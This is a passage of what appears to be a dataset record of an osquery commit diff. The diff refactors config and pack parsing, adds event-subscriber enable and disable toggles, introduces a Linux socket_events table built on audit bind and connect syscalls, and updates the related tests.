    +\n+    // The config parser plugin will receive a copy of each property tree\
    \ for\n+    // each top-level-config key. The parser may choose to update the\
    \ config's\n+    // internal state\n+    parser->update(parser_config);\n+  }\n\
    +  return Status(0, \"OK\");\n+}\n+\n Status Config::update(const std::map<std::string,\
    \ std::string>& config) {\n   // A config plugin may call update from an extension.\
    \ This will update\n   // the config instance within the extension process and\
    \ the update must be\n@@ -142,96 +243,9 @@ Status Config::update(const std::map<std::string,\
    \ std::string>& config) {\n   }\n \n   for (const auto& source : config) {\n-\
    \    hashSource(source.first, source.second);\n-\n-    // load the config (source.second)\
    \ into a pt::ptree\n-    std::stringstream json;\n-    json << source.second;\n\
    -    pt::ptree tree;\n-    try {\n-      pt::read_json(json, tree);\n-    } catch\
    \ (const pt::json_parser::json_parser_error& e) {\n-      return Status(1, \"\
    Error parsing the config JSON. Check the syntax.\");\n-    }\n-\n-    // extract\
    \ the \"schedule\" key and store it as the main pack\n-    if (tree.count(\"schedule\"\
    ) > 0) {\n-      auto& schedule = tree.get_child(\"schedule\");\n-      pt::ptree\
    \ main_pack;\n-      main_pack.add_child(\"queries\", schedule);\n-      addPack(Pack(\"\
    main\", source.first, main_pack));\n-    }\n-\n-    if (tree.count(\"scheduledQueries\"\
    ) > 0) {\n-      auto& scheduled_queries = tree.get_child(\"scheduledQueries\"\
    );\n-      pt::ptree queries;\n-      for (const std::pair<std::string, pt::ptree>&\
    \ query : scheduled_queries) {\n-        auto query_name = query.second.get<std::string>(\"\
    name\", \"\");\n-        if (query_name.empty()) {\n-          return Status(1,\
    \ \"Error getting name from legacy scheduled query\");\n-        }\n-        queries.add_child(query_name,\
    \ query.second);\n-      }\n-      pt::ptree legacy_pack;\n-      legacy_pack.add_child(\"\
    queries\", queries);\n-      addPack(Pack(\"legacy_main\", source.first, legacy_pack));\n\
    -    }\n-\n-    // extract the \"packs\" key into additional pack objects\n- \
    \   if (tree.count(\"packs\") > 0) {\n-      auto& packs = tree.get_child(\"packs\"\
    );\n-      for (const auto& pack : packs) {\n-        auto value = packs.get<std::string>(pack.first,\
    \ \"\");\n-        if (value.empty()) {\n-          addPack(Pack(pack.first, source.first,\
    \ pack.second));\n-        } else {\n-          PluginResponse response;\n-  \
    \        auto status = Registry::call(\n-              \"config\",\n-        \
    \      {{\"action\", \"genPack\"}, {\"name\", pack.first}, {\"value\", value}},\n\
    -              response);\n-          if (!status.ok()) {\n-            return\
    \ status;\n-          }\n-\n-          if (response.size() > 0) {\n-         \
    \   try {\n-              addPack(Pack(pack.first, source.first, response[0][pack.first]));\n\
    -            } catch (const std::exception& e) {\n-              return Status(1,\n\
    -                            \"Error accessing pack plugin response: \" +\n- \
    \                               std::string(e.what()));\n-            }\n-   \
    \       }\n-        }\n-      }\n-    }\n-\n-    for (const auto& plugin : Registry::all(\"\
    config_parser\")) {\n-      std::shared_ptr<ConfigParserPlugin> parser;\n-   \
    \   try {\n-\tparser = std::dynamic_pointer_cast<ConfigParserPlugin>(plugin.second);\n\
    -      } catch (const std::bad_cast& e) {\n-        LOG(ERROR) << \"Error casting\
    \ config parser plugin: \" << plugin.first;\n-      }\n-      if (parser == nullptr\
    \ || parser.get() == nullptr) {\n-        continue;\n-      }\n-\n-      // For\
    \ each key requested by the parser, add a property tree reference.\n-      std::map<std::string,\
    \ pt::ptree> parser_config;\n-      for (const auto& key : parser->keys()) {\n\
    -        if (tree.count(key) > 0) {\n-          parser_config[key] = tree.get_child(key);\n\
    -        } else {\n-          parser_config[key] = pt::ptree();\n-        }\n\
    -      }\n-\n-      // The config parser plugin will receive a copy of each property\
    \ tree for\n-      // each top-level-config key. The parser may choose to update\
    \ the config's\n-      // internal state\n-      parser->update(parser_config);\n\
    +    auto status = updateSource(source.first, source.second);\n+    if (!status.ok())\
    \ {\n+      return status;\n     }\n   }\n "
  - "--- a/osquery/config/packs.cpp\n+++ b/osquery/config/packs.cpp\n@@ -33,44 +33,6\
    \ @@ FLAG(int32,\n      3600,\n      \"Query interval to use if none is provided\"\
    );\n \n-Pack::Pack(const std::string& name, const pt::ptree& tree) {\n-  initialize(name,\
    \ \"\", tree);\n-}\n-\n-Pack::Pack(const std::string& name,\n-           const\
    \ std::string& source,\n-           const pt::ptree& tree) {\n-  initialize(name,\
    \ source, tree);\n-}\n-\n-Pack::Pack(const std::string& name, const std::string&\
    \ json) {\n-  std::stringstream stream;\n-  stream << json;\n-  pt::ptree tree;\n\
    -  try {\n-    pt::read_json(stream, tree);\n-  } catch (const pt::json_parser::json_parser_error&\
    \ e) {\n-    LOG(ERROR) << \"Error parsing pack JSON. Re-throwing the exception.\"\
    ;\n-    throw;\n-  }\n-  initialize(name, \"\", tree);\n-}\n-\n-Pack::Pack(const\
    \ std::string& name,\n-           const std::string& source,\n-           const\
    \ std::string& json) {\n-  std::stringstream stream;\n-  stream << json;\n-  pt::ptree\
    \ tree;\n-  try {\n-    pt::read_json(stream, tree);\n-  } catch (const pt::json_parser::json_parser_error&\
    \ e) {\n-    LOG(ERROR) << \"Error parsing pack JSON. Re-throwing the exception.\"\
    ;\n-    throw;\n-  }\n-  initialize(name, source, tree);\n-}\n-\n int splayValue(int\
    \ original, int splayPercent) {\n   if (splayPercent <= 0 || splayPercent > 100)\
    \ {\n     return original;\n@@ -109,39 +71,46 @@ void Pack::initialize(const std::string&\
    \ name,\n \n   platform_.clear();\n   if (tree.count(\"platform\") > 0) {\n- \
    \   platform_ = tree.get<std::string>(\"platform\");\n+    platform_ = tree.get<std::string>(\"\
    platform\", \"\");\n   }\n \n   version_.clear();\n   if (tree.count(\"version\"\
    ) > 0) {\n-    version_ = tree.get<std::string>(\"version\");\n+    version_ =\
    \ tree.get<std::string>(\"version\", \"\");\n   }\n \n   schedule_.clear();\n\
    -  if (tree.count(\"queries\") > 0) {\n-    for (const auto& q : tree.get_child(\"\
    queries\")) {\n-      if (q.second.count(\"platform\")) {\n-        if (!checkPlatform(q.second.get<std::string>(\"\
    platform\"))) {\n-          continue;\n-        }\n+  if (tree.count(\"queries\"\
    ) == 0) {\n+    // This pack contained no queries.\n+    return;\n+  }\n+\n+ \
    \ for (const auto& q : tree.get_child(\"queries\")) {\n+    if (q.second.count(\"\
    platform\")) {\n+      if (!checkPlatform(q.second.get<std::string>(\"platform\"\
    , \"\"))) {\n+        continue;\n       }\n+    }\n \n-      if (q.second.count(\"\
    version\")) {\n-        if (!checkVersion(q.second.get<std::string>(\"version\"\
    ))) {\n-          continue;\n-        }\n+    if (q.second.count(\"version\"))\
    \ {\n+      if (!checkVersion(q.second.get<std::string>(\"version\", \"\"))) {\n\
    +        continue;\n       }\n+    }\n \n-      ScheduledQuery query;\n-     \
    \ query.interval =\n-          q.second.get<int>(\"interval\", FLAGS_schedule_default_interval);\n\
    -      query.splayed_interval =\n-          splayValue(query.interval, FLAGS_schedule_splay_percent);\n\
    -      query.query = q.second.get<std::string>(\"query\");\n-      query.options[\"\
    snapshot\"] = q.second.get<bool>(\"snapshot\", false);\n-      query.options[\"\
    removed\"] = q.second.get<bool>(\"removed\", true);\n-      schedule_[q.first]\
    \ = query;\n+    ScheduledQuery query;\n+    query.interval = q.second.get(\"\
    interval\", FLAGS_schedule_default_interval);\n+    query.query = q.second.get<std::string>(\"\
    query\", \"\");\n+    if (query.interval == 0 || query.query.empty()) {\n+   \
    \   // Invalid pack query.\n+      continue;\n     }\n+\n+    query.splayed_interval\
    \ =\n+        splayValue(query.interval, FLAGS_schedule_splay_percent);\n+   \
    \ query.options[\"snapshot\"] = q.second.get<bool>(\"snapshot\", false);\n+  \
    \  query.options[\"removed\"] = q.second.get<bool>(\"removed\", true);\n+    schedule_[q.first]\
    \ = query;\n   }\n }\n "
  - "--- a/osquery/config/parsers/events.cpp\n+++ b/osquery/config/parsers/events.cpp\n\
    @@ -21,10 +21,7 @@ class EventsConfigParserPlugin : public ConfigParserPlugin\
    \ {\n  public:\n   std::vector<std::string> keys() { return {\"events\"}; }\n\
    \ \n-  Status setUp() {\n-    data_.put_child(\"events\", pt::ptree());\n-   \
    \ return Status(0, \"OK\");\n-  }\n+  EventsConfigParserPlugin() { data_.put_child(\"\
    events\", pt::ptree()); }\n \n   Status update(const std::map<std::string, pt::ptree>&\
    \ config) {\n     if (config.count(\"events\") > 0) {"
  - "--- a/osquery/config/parsers/tests/events_tests.cpp\n+++ b/osquery/config/parsers/tests/events_tests.cpp\n\
    @@ -35,7 +35,7 @@ TEST_F(EventsConfigParserPluginTests, test_get_event) {\n \n\
    \   auto plugin = Config::getInstance().getParser(\"events\");\n   EXPECT_TRUE(plugin\
    \ != nullptr);\n-  auto data = plugin->getData();\n+  const auto& data = plugin->getData();\n\
    \ \n   EXPECT_EQ(data.count(\"events\"), 1U);\n   EXPECT_GT(data.get_child(\"\
    events\").count(\"environment_variables\"), 0U);"
  - "--- a/osquery/config/tests/config_tests.cpp\n+++ b/osquery/config/tests/config_tests.cpp\n\
    @@ -10,6 +10,8 @@\n #include <memory>\n #include <vector>\n \n+#include <boost/property_tree/json_parser.hpp>\n\
    +\n #include <gtest/gtest.h>\n \n #include <osquery/config.h>\n@@ -139,7 +141,7\
    \ @@ TEST_F(ConfigTests, test_parse) {\n   auto tree = getExamplePacksConfig();\n\
    \   auto packs = tree.get_child(\"packs\");\n   for (const auto& pack : packs)\
    \ {\n-    c.addPack(Pack(pack.first, pack.second));\n+    c.addPack(pack.first,\
    \ \"\", pack.second);\n   }\n   for (Pack& p : c.schedule_) {\n     EXPECT_TRUE(p.shouldPackExecute());\n\
    @@ -148,7 +150,7 @@ TEST_F(ConfigTests, test_parse) {\n \n TEST_F(ConfigTests,\
    \ test_remove) {\n   auto c = Config();\n-  c.addPack(Pack(\"kernel\", getUnrestrictedPack()));\n\
    +  c.addPack(\"kernel\", \"\", getUnrestrictedPack());\n   c.removePack(\"kernel\"\
    );\n   for (Pack& pack : c.schedule_) {\n     EXPECT_NE(\"kernel\", pack.getName());\n\
    @@ -161,7 +163,7 @@ TEST_F(ConfigTests, test_add_remove_pack) {\n   auto last\
    \ = c.schedule_.end();\n   EXPECT_EQ(std::distance(first, last), 0);\n \n-  c.addPack(Pack(\"\
    kernel\", getUnrestrictedPack()));\n+  c.addPack(\"kernel\", \"\", getUnrestrictedPack());\n\
    \   first = c.schedule_.begin();\n   last = c.schedule_.end();\n   EXPECT_EQ(std::distance(first,\
    \ last), 1);\n@@ -175,7 +177,7 @@ TEST_F(ConfigTests, test_add_remove_pack) {\n\
    \ TEST_F(ConfigTests, test_get_scheduled_queries) {\n   std::vector<ScheduledQuery>\
    \ queries;\n   auto c = Config();\n-  c.addPack(Pack(\"kernel\", getUnrestrictedPack()));\n\
    +  c.addPack(\"kernel\", \"\", getUnrestrictedPack());\n   c.scheduledQueries(\n\
    \       ([&queries](const std::string&, const ScheduledQuery& query) {\n     \
    \    queries.push_back(query);\n@@ -198,7 +200,7 @@ TEST_F(ConfigTests, test_get_parser)\
    \ {\n \n   const auto& parser =\n       std::dynamic_pointer_cast<TestConfigParserPlugin>(plugin);\n\
    -  auto data = parser->getData();\n+  const auto& data = parser->getData();\n\
    \ \n   EXPECT_EQ(data.count(\"list\"), 1U);\n   EXPECT_EQ(data.count(\"dictionary\"\
    ), 1U);"
  - "--- a/osquery/config/tests/packs_tests.cpp\n+++ b/osquery/config/tests/packs_tests.cpp\n\
    @@ -7,6 +7,9 @@\n  *  of patent rights can be found in the PATENTS file in the\
    \ same directory.\n  *\n  */\n+\n+#include <boost/property_tree/json_parser.hpp>\n\
    +\n #include <gtest/gtest.h>\n \n #include <osquery/core.h>\n@@ -123,14 +126,8\
    \ @@ TEST_F(PacksTests, test_schedule) {\n }\n \n TEST_F(PacksTests, test_discovery_cache)\
    \ {\n-  auto pack = Pack(\"kernel\", getPackWithValidDiscovery());\n-  auto& stats\
    \ = pack.getStats();\n-  EXPECT_EQ(stats.total, 0);\n-  EXPECT_EQ(stats.hits,\
    \ 0);\n-  EXPECT_EQ(stats.misses, 0);\n-\n   auto c = Config();\n-  c.addPack(pack);\n\
    +  c.addPack(\"kernel\", \"\", getPackWithValidDiscovery());\n   size_t query_count\
    \ = 0;\n   for (size_t i = 0; i < 5; i++) {\n     c.scheduledQueries("
  - "--- a/osquery/events/darwin/tests/fsevents_tests.cpp\n+++ b/osquery/events/darwin/tests/fsevents_tests.cpp\n\
    @@ -252,7 +252,7 @@ TEST_F(FSEventsTests, test_fsevents_fire_event) {\n \n   //\
    \ Simulate registering an event subscriber.\n   auto sub = std::make_shared<TestFSEventsEventSubscriber>();\n\
    -  auto status = sub->init();\n+  EventFactory::registerEventSubscriber(sub);\n\
    \ \n   // Create a subscriptioning context, note the added Event to the symbol\n\
    \   auto sc = sub->GetSubscription(0);"
  - "--- a/osquery/events/events.cpp\n+++ b/osquery/events/events.cpp\n@@ -14,6 +14,7\
    \ @@\n #include <boost/algorithm/string/classification.hpp>\n #include <boost/lexical_cast.hpp>\n\
    \ \n+#include <osquery/config.h>\n #include <osquery/core.h>\n #include <osquery/events.h>\n\
    \ #include <osquery/flags.h>\n@@ -586,21 +587,49 @@ Status EventFactory::registerEventSubscriber(const\
    \ PluginRef& sub) {\n     return Status(1, \"Invalid subscriber\");\n   }\n \n\
    +  // The config may use an \"events\" key to explicitly enabled or disable\n\
    +  // event subscribers. See EventSubscriber::disable.\n+  auto name = specialized_sub->getName();\n\
    +  auto plugin = Config::getInstance().getParser(\"events\");\n+  if (plugin !=\
    \ nullptr && plugin.get() != nullptr) {\n+    const auto& data = plugin->getData();\n\
    +    // First perform explicit enabling.\n+    if (data.get_child(\"events\").count(\"\
    enable_subscribers\") > 0) {\n+      for (const auto& item : data.get_child(\"\
    events.enable_subscribers\")) {\n+        if (item.second.data() == name) {\n\
    +          VLOG(1) << \"Enabling event subscriber: \" << name;\n+          specialized_sub->disabled\
    \ = false;\n+        }\n+      }\n+    }\n+    // Then use explicit disabling\
    \ as an ultimate override.\n+    if (data.get_child(\"events\").count(\"disable_subscribers\"\
    ) > 0) {\n+      for (const auto& item : data.get_child(\"events.disable_subscribers\"\
    )) {\n+        if (item.second.data() == name) {\n+          VLOG(1) << \"Disabling\
    \ event subscriber: \" << name;\n+          specialized_sub->disabled = true;\n\
    +        }\n+      }\n+    }\n+  }\n+\n   // Let the module initialize any Subscriptions.\n\
    \   auto status = Status(0, \"OK\");\n-  if (!FLAGS_disable_events) {\n+  if (!FLAGS_disable_events\
    \ && !specialized_sub->disabled) {\n     status = specialized_sub->init();\n+\
    \    specialized_sub->state(SUBSCRIBER_RUNNING);\n+  } else {\n+    specialized_sub->state(SUBSCRIBER_PAUSED);\n\
    \   }\n \n   auto& ef = EventFactory::getInstance();\n-  ef.event_subs_[specialized_sub->getName()]\
    \ = specialized_sub;\n+  ef.event_subs_[name] = specialized_sub;\n \n   // Set\
    \ state of subscriber.\n   if (!status.ok()) {\n     specialized_sub->state(SUBSCRIBER_FAILED);\n\
    \     return Status(1, status.getMessage());\n   } else {\n-    specialized_sub->state(SUBSCRIBER_RUNNING);\n\
    \     return Status(0, \"OK\");\n   }\n }\n@@ -728,6 +757,7 @@ void EventFactory::end(bool\
    \ join) {\n \n   // Threads may still be executing, when they finish, release\
    \ publishers.\n   ef.event_pubs_.clear();\n+  ef.event_subs_.clear();\n }\n \n\
    \ void attachEvents() {\n@@ -740,7 +770,7 @@ void attachEvents() {\n   for (const\
    \ auto& subscriber : subscribers) {\n     auto status = EventFactory::registerEventSubscriber(subscriber.second);\n\
    \     if (!status.ok()) {\n-      LOG(ERROR) << \"Error registering subscriber:\
    \ \" << status.getMessage();\n+      LOG(WARNING) << \"Error registering subscriber:\
    \ \" << status.getMessage();\n     }\n   }\n }"
  - "--- a/osquery/events/linux/tests/inotify_tests.cpp\n+++ b/osquery/events/linux/tests/inotify_tests.cpp\n\
    @@ -260,7 +260,7 @@ TEST_F(INotifyTests, test_inotify_fire_event) {\n   // Assume\
    \ event type is registered.\n   StartEventLoop();\n   auto sub = std::make_shared<TestINotifyEventSubscriber>();\n\
    -  sub->init();\n+  EventFactory::registerEventSubscriber(sub);\n \n   // Create\
    \ a subscriptioning context, note the added Event to the symbol\n   auto sc =\
    \ sub->GetSubscription(real_test_path, 0);\n@@ -278,7 +278,7 @@ TEST_F(INotifyTests,\
    \ test_inotify_event_action) {\n   // Assume event type is registered.\n   StartEventLoop();\n\
    \   auto sub = std::make_shared<TestINotifyEventSubscriber>();\n-  sub->init();\n\
    +  EventFactory::registerEventSubscriber(sub);\n \n   auto sc = sub->GetSubscription(real_test_path,\
    \ 0);\n   sub->subscribe(&TestINotifyEventSubscriber::Callback, sc, nullptr);\n\
    @@ -315,7 +315,7 @@ TEST_F(INotifyTests, test_inotify_recursion) {\n   StartEventLoop();\n\
    \ \n   auto sub = std::make_shared<TestINotifyEventSubscriber>();\n-  sub->init();\n\
    +  EventFactory::registerEventSubscriber(sub);\n \n   boost::filesystem::create_directory(real_test_dir);\n\
    \   boost::filesystem::create_directory(real_test_sub_dir);"
  - "--- a/osquery/events/tests/events_database_tests.cpp\n+++ b/osquery/events/tests/events_database_tests.cpp\n\
    @@ -20,18 +20,16 @@\n \n namespace osquery {\n \n-//const std::string kTestingEventsDBPath\
    \ = \"/tmp/rocksdb-osquery-testevents\";\n-\n class EventsDatabaseTests : public\
    \ ::testing::Test {};\n \n-class FakeEventPublisher\n+class DBFakeEventPublisher\n\
    \     : public EventPublisher<SubscriptionContext, EventContext> {\n-  DECLARE_PUBLISHER(\"\
    FakePublisher\");\n+  DECLARE_PUBLISHER(\"DBFakePublisher\");\n };\n \n-class\
    \ FakeEventSubscriber : public EventSubscriber<FakeEventPublisher> {\n+class DBFakeEventSubscriber\
    \ : public EventSubscriber<DBFakeEventPublisher> {\n  public:\n-  FakeEventSubscriber()\
    \ { setName(\"FakeSubscriber\"); }\n+  DBFakeEventSubscriber() { setName(\"DBFakeSubscriber\"\
    ); }\n   /// Add a fake event at time t\n   Status testAdd(int t) {\n     Row\
    \ r;\n@@ -41,7 +39,7 @@ class FakeEventSubscriber : public EventSubscriber<FakeEventPublisher>\
    \ {\n };\n \n TEST_F(EventsDatabaseTests, test_event_module_id) {\n-  auto sub\
    \ = std::make_shared<FakeEventSubscriber>();\n+  auto sub = std::make_shared<DBFakeEventSubscriber>();\n\
    \   sub->doNotExpire();\n \n   // Not normally available outside of EventSubscriber->Add().\n\
    @@ -52,13 +50,13 @@ TEST_F(EventsDatabaseTests, test_event_module_id) {\n }\n\
    \ \n TEST_F(EventsDatabaseTests, test_event_add) {\n-  auto sub = std::make_shared<FakeEventSubscriber>();\n\
    +  auto sub = std::make_shared<DBFakeEventSubscriber>();\n   auto status = sub->testAdd(1);\n\
    \   EXPECT_TRUE(status.ok());\n }\n \n TEST_F(EventsDatabaseTests, test_record_indexing)\
    \ {\n-  auto sub = std::make_shared<FakeEventSubscriber>();\n+  auto sub = std::make_shared<DBFakeEventSubscriber>();\n\
    \   auto status = sub->testAdd(2);\n   status = sub->testAdd(11);\n   status =\
    \ sub->testAdd(61);\n@@ -99,7 +97,7 @@ TEST_F(EventsDatabaseTests, test_record_indexing)\
    \ {\n }\n \n TEST_F(EventsDatabaseTests, test_record_range) {\n-  auto sub = std::make_shared<FakeEventSubscriber>();\n\
    +  auto sub = std::make_shared<DBFakeEventSubscriber>();\n \n   // Search within\
    \ a specific record range.\n   auto indexes = sub->getIndexes(0, 10);\n@@ -124,7\
    \ +122,7 @@ TEST_F(EventsDatabaseTests, test_record_range) {\n }\n \n TEST_F(EventsDatabaseTests,\
    \ test_record_expiration) {\n-  auto sub = std::make_shared<FakeEventSubscriber>();\n\
    +  auto sub = std::make_shared<DBFakeEventSubscriber>();\n \n   // No expiration\n\
    \   auto indexes = sub->getIndexes(0, 5000);"
  - "--- a/osquery/events/tests/events_tests.cpp\n+++ b/osquery/events/tests/events_tests.cpp\n\
    @@ -8,31 +8,19 @@\n  *\n  */\n \n-#include <typeinfo>\n-\n #include <boost/filesystem/operations.hpp>\n\
    \ \n #include <gtest/gtest.h>\n \n #include <osquery/events.h>\n #include <osquery/tables.h>\n\
    \ \n-#include \"osquery/database/db_handle.h\"\n-\n namespace osquery {\n \n-const\
    \ std::string kTestingEventsDBPath = \"/tmp/rocksdb-osquery-testevents\";\n-\n\
    \ class EventsTests : public ::testing::Test {\n  public:\n-  void SetUp() {\n\
    -    // Setup a testing DB instance\n-    DBHandle::getInstanceAtPath(kTestingEventsDBPath);\n\
    -  }\n-\n   void TearDown() {\n-    EventFactory::end();\n-    boost::filesystem::remove_all(osquery::kTestingEventsDBPath);\n\
    +    EventFactory::end(true);\n   }\n };\n \n@@ -364,6 +352,8 @@ TEST_F(EventsTests,\
    \ test_fire_event) {\n   status = EventFactory::registerEventPublisher(pub);\n\
    \ \n   auto sub = std::make_shared<FakeEventSubscriber>();\n+  EventFactory::registerEventSubscriber(sub);\n\
    +\n   auto subscription = Subscription::create(\"FakeSubscriber\");\n   subscription->callback\
    \ = TestTheeCallback;\n   status = EventFactory::addSubscription(\"publisher\"\
    , subscription);\n@@ -407,4 +397,23 @@ TEST_F(EventsTests, test_subscriber_names)\
    \ {\n   EXPECT_EQ(sub->getName(), \"FakeSubscriber\");\n   EXPECT_EQ(sub->dbNamespace(),\
    \ \"FakePublisher.FakeSubscriber\");\n }\n+\n+class DisabledEventSubscriber :\
    \ public EventSubscriber<FakeEventPublisher> {\n+ public:\n+  DisabledEventSubscriber()\
    \ : EventSubscriber(false) {}\n+};\n+\n+TEST_F(EventsTests, test_event_toggle_subscribers)\
    \ {\n+  // Make sure subscribers can disable themselves using the event subscriber\n\
    +  // constructor parameter.\n+  auto sub = std::make_shared<DisabledEventSubscriber>();\n\
    +  EXPECT_TRUE(sub->disabled);\n+  // Normal subscribers will be enabled.\n+ \
    \ auto sub2 = std::make_shared<SubFakeEventSubscriber>();\n+  EXPECT_FALSE(sub2->disabled);\n\
    +\n+  // Registering a disabled subscriber will put it into a paused state.\n\
    +  EventFactory::registerEventSubscriber(sub);\n+  EXPECT_EQ(sub->state(), SUBSCRIBER_PAUSED);\n\
    +}\n }"
  - "--- a/osquery/tables/events/darwin/process_events.cpp\n+++ b/osquery/tables/events/darwin/process_events.cpp\n\
    @@ -75,7 +75,7 @@ Status ProcessEventSubscriber::Callback(\n     if (plugin ==\
    \ nullptr || plugin.get() == nullptr) {\n       LOG(ERROR) << \"Could not load\
    \ events config parser\";\n     } else {\n-      auto data = plugin->getData();\n\
    +      const auto &data = plugin->getData();\n       if (data.get_child(\"events\"\
    ).count(\"environment_variables\") > 0) {\n         use_whitelist = true;\n  \
    \       whitelist = data.get_child(\"events.environment_variables\");"
  - '--- a/osquery/tables/events/linux/socket_events.cpp

    +++ b/osquery/tables/events/linux/socket_events.cpp

    @@ -0,0 +1,101 @@

    +/*

    + *  Copyright (c) 2014, Facebook, Inc.

    + *  All rights reserved.

    + *

    + *  This source code is licensed under the BSD-style license found in the

    + *  LICENSE file in the root directory of this source tree. An additional grant

    + *  of patent rights can be found in the PATENTS file in the same directory.

    + *

    + */

    +

    +#include <osquery/sql.h>

    +

    +#include "osquery/events/linux/audit.h"

    +

    +namespace osquery {

    +

    +#define AUDIT_SYSCALL_BIND 49

    +#define AUDIT_SYSCALL_CONNECT 42

    +

    +// Depend on the external getUptime table method.

    +namespace tables {

    +extern long getUptime();

    +}

    +

    +class SocketEventSubscriber : public EventSubscriber<AuditEventPublisher> {

    + public:

    +  /// Decorating syscall events with socket information on Linux is expensive.

    +  SocketEventSubscriber() : EventSubscriber(false) {}

    +

    +  /// The process event subscriber declares an audit event type subscription.

    +  Status init();

    +

    +  /// Kernel events matching the event type will fire.

    +  Status Callback(const AuditEventContextRef& ec, const void* user_data);

    +};

    +

    +REGISTER(SocketEventSubscriber, "event_subscriber", "socket_events");

    +

    +Status SocketEventSubscriber::init() {

    +  auto sc = createSubscriptionContext();

    +

    +  // Monitor for bind and connect syscalls.

    +  sc->rules.push_back({AUDIT_SYSCALL_BIND, ""});

    +  sc->rules.push_back({AUDIT_SYSCALL_CONNECT, ""});

    +

    +  // Drop events if they are encountered outside of the expected state.

    +  // sc->types = {AUDIT_SYSCALL};

    +  subscribe(&SocketEventSubscriber::Callback, sc, nullptr);

    +

    +  return Status(0, "OK");

    +}

    +

    +Status SocketEventSubscriber::Callback(const AuditEventContextRef& ec,

    +                                       const void* user_data) {

    +  Row r;

    +  r["pid"] = ec->fields["pid"];

    +  r["path"] = ec->fields["exe"];

    +  r["fd"] = ec->fields["a0"];

    +

    +  if (ec->syscall == AUDIT_SYSCALL_CONNECT) {

    +    r["action"] = "connect";

    +    // The connect syscall must exit with EINPROGRESS

    +    if (ec->fields.count("exit") && ec->fields.at("exit") != "-115") {

    +      return Status(0, "Not recording socket event");

    +    }

    +

    +  } else if (ec->syscall == AUDIT_SYSCALL_BIND) {

    +    r["action"] = "bind";

    +  }

    +

    +  // The open/bind success status.

    +  r["success"] = (ec->fields["success"] == "yes") ? "1" : "0";

    +

    +  auto qd = SQL::selectAllFrom("process_open_sockets", "pid", EQUALS, r["pid"]);

    +  for (const auto& row : qd) {

    +    if (row.at("fd") == r["fd"]) {

    +      // For the socket event that happens before a bind.

    +      if (row.at("socket").empty()) {

    +        return Status(0, "No socket information");

    +      }

    +

    +      r["socket"] = row.at("socket");

    +      r["family"] = row.at("family");

    +      r["protocol"] = row.at("protocol");

    +      r["remote_address"] = row.at("remote_address");

    +      r["local_address"] = row.at("local_address");

    +      r["remote_port"] = row.at("remote_port");

    +      r["local_port"] = row.at("local_port");

    +      break;

    +    }

    +  }

    +

    +  if (r.count("socket") == 0) {

    +    return Status(0, "No socket found");

    +  }

    +

    +  r["uptime"] = std::to_string(tables::getUptime());

    +  add(r, getUnixTime());

    +  return Status(0, "OK");

    +}

    +} // namespace osquery'
  - "--- a/osquery/tables/events/yara_events.cpp\n+++ b/osquery/tables/events/yara_events.cpp\n\
    @@ -157,8 +157,7 @@ Status YARAEventSubscriber::Callback(const FileEventContextRef&\
    \ ec,\n   // Use the category as a lookup into the yara file_paths. The value\
    \ will be\n   // a list of signature groups to scan with.\n   auto category =\
    \ r.at(\"category\");\n-  pt::ptree yara_config;\n-  yara_config = parser->getData();\n\
    +  const auto& yara_config = parser->getData();\n   const auto& yara_paths = yara_config.get_child(\"\
    file_paths\");\n   const auto& sig_groups = yara_paths.find(category);\n   for\
    \ (const auto& rule : sig_groups->second) {"
  - "--- a/osquery/tables/networking/linux/process_open_sockets.cpp\n+++ b/osquery/tables/networking/linux/process_open_sockets.cpp\n\
    @@ -14,7 +14,6 @@\n \n #include <osquery/core.h>\n #include <osquery/filesystem.h>\n\
    -#include <osquery/logger.h>\n #include <osquery/tables.h>\n \n namespace osquery\
    \ {\n@@ -29,6 +28,9 @@ const std::map<int, std::string> kLinuxProtocolNames =\
    \ {\n     {IPPROTO_RAW, \"raw\"},\n };\n \n+// A map of socket handles (inodes)\
    \ to their pid and file descriptor.\n+typedef std::map<std::string, std::pair<std::string,\
    \ std::string> > InodeMap;\n+\n std::string addressFromHex(const std::string &encoded_address,\
    \ int family) {\n   char addr_buffer[INET6_ADDRSTRLEN] = {0};\n   if (family ==\
    \ AF_INET) {\n@@ -50,7 +52,7 @@ std::string addressFromHex(const std::string &encoded_address,\
    \ int family) {\n     }\n   }\n \n-  return TEXT(addr_buffer);\n+  return std::string(addr_buffer);\n\
    \ }\n \n unsigned short portFromHex(const std::string &encoded_port) {\n@@ -61,7\
    \ +63,7 @@ unsigned short portFromHex(const std::string &encoded_port) {\n   return\
    \ decoded;\n }\n \n-void genSocketsFromProc(const std::map<std::string, std::string>\
    \ &inodes,\n+void genSocketsFromProc(const InodeMap &inodes,\n               \
    \          int protocol,\n                         int family,\n             \
    \            QueryData &results) {\n@@ -133,9 +135,11 @@ void genSocketsFromProc(const\
    \ std::map<std::string, std::string> &inodes,\n     }\n \n     if (inodes.count(r[\"\
    socket\"]) > 0) {\n-      r[\"pid\"] = inodes.at(r[\"socket\"]);\n+      r[\"\
    pid\"] = inodes.at(r[\"socket\"]).second;\n+      r[\"fd\"] = inodes.at(r[\"socket\"\
    ]).first;\n     } else {\n       r[\"pid\"] = \"-1\";\n+      r[\"fd\"] = \"-1\"\
    ;\n     }\n \n     results.push_back(r);\n@@ -154,15 +158,16 @@ QueryData genOpenSockets(QueryContext\
    \ &context) {\n   }\n \n   // Generate a map of socket inode to process tid.\n\
    -  std::map<std::string, std::string> socket_inodes;\n+  InodeMap socket_inodes;\n\
    \   for (const auto &process : pids) {\n     std::map<std::string, std::string>\
    \ descriptors;\n     if (osquery::procDescriptors(process, descriptors).ok())\
    \ {\n       for (const auto& fd : descriptors) {\n         if (fd.second.find(\"\
    socket:[\") == 0) {\n           // See #792: std::regex is incomplete until GCC\
    \ 4.9 (skip 8 chars)\n           auto inode = fd.second.substr(8);\n-        \
    \  socket_inodes[inode.substr(0, inode.size() - 1)] = process;\n+          socket_inodes[inode.substr(0,\
    \ inode.size() - 1)] =\n+              std::make_pair(fd.first, process);\n  \
    \       }\n       }\n     }"
  - "--- a/osquery/tables/system/darwin/process_open_descriptors.cpp\n+++ b/osquery/tables/system/darwin/process_open_descriptors.cpp\n\
    @@ -108,7 +108,8 @@ void genSocketDescriptor(int pid, int descriptor, QueryData\
    \ &results) {\n     Row r;\n \n     r[\"pid\"] = INTEGER(pid);\n-    r[\"socket\"\
    ] = INTEGER(descriptor);\n+    r[\"fd\"] = BIGINT(descriptor);\n+    r[\"socket\"\
    ] = BIGINT(si.psi.soi_so);\n     r[\"path\"] = \"\";\n \n     // Darwin/OSX SOCKINFO_TCP\
    \ is not IPPROTO_TCP"
  commit_message: 'This refactors a bit of config/packs and adds a socket_events table
    to Linux.


